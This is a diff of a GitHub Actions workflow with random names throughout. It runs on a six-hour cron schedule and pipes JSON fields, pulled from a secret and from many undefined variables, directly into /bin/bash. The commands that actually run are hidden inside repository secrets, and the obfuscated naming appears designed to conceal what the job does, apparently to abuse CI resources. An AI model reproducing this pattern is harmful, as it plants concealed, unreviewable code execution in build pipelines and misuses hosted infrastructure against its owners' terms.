@@ -1,10 +1,9 @@
 name: zhaoyinluo4178
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 4/6 * * *'
-jobs:  # 10846
+    - cron: '18 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +11,25 @@ jobs:  # 10846
       - uses: actions/checkout@v4
       - name: zhaoyinluo4178
         env:
-          yux39597: ${{ secrets.yux39597 }}
+          c588: ${{ secrets.c588 }}
         run: |
-          echo $yux39597 | jq -r .gfvr016 | /bin/bash
-          echo $vzuz98 | jq -r .xdv53 | /bin/bash
-          echo $lr499 | jq -r .mctfw1817 | /bin/bash
-          echo $qksu30860 | jq -r .xcxs98 | /bin/bash
-          echo $p9 | jq -r .qzam00 | /bin/bash
+          echo $c588 | jq -r .p73289 | /bin/bash
+          echo $cpzu53026 | jq -r .hxz78149 | /bin/bash
+          echo $v56942 | jq -r .rp8 | /bin/bash
+          echo $pz26875 | jq -r .e375 | /bin/bash
+          echo $ybv858 | jq -r .sa86037 | /bin/bash
+          echo $usvud96 | jq -r .tt19241 | /bin/bash
+          echo $w10587 | jq -r .naafh1353 | /bin/bash
+          echo $u304 | jq -r .sh88393 | /bin/bash
+          echo $w07 | jq -r .qi261 | /bin/bash
+          echo $cv42 | jq -r .symw00 | /bin/bash
+          echo $ozow5169 | jq -r .e41 | /bin/bash
+          echo $mppks2 | jq -r .cktlm74938 | /bin/bash
+          echo $wub7678 | jq -r .iciqp53 | /bin/bash
+          echo $lwpu7661 | jq -r .hda26 | /bin/bash
+          echo $ne827 | jq -r .o91 | /bin/bash
+          echo $to1 | jq -r .y821 | /bin/bash
+          echo $qtmpy01818 | jq -r .tm9 | /bin/bash
+          echo $lgr629 | jq -r .rus353 | /bin/bash
+          echo $fsqbn56 | jq -r .ta21 | /bin/bash
 
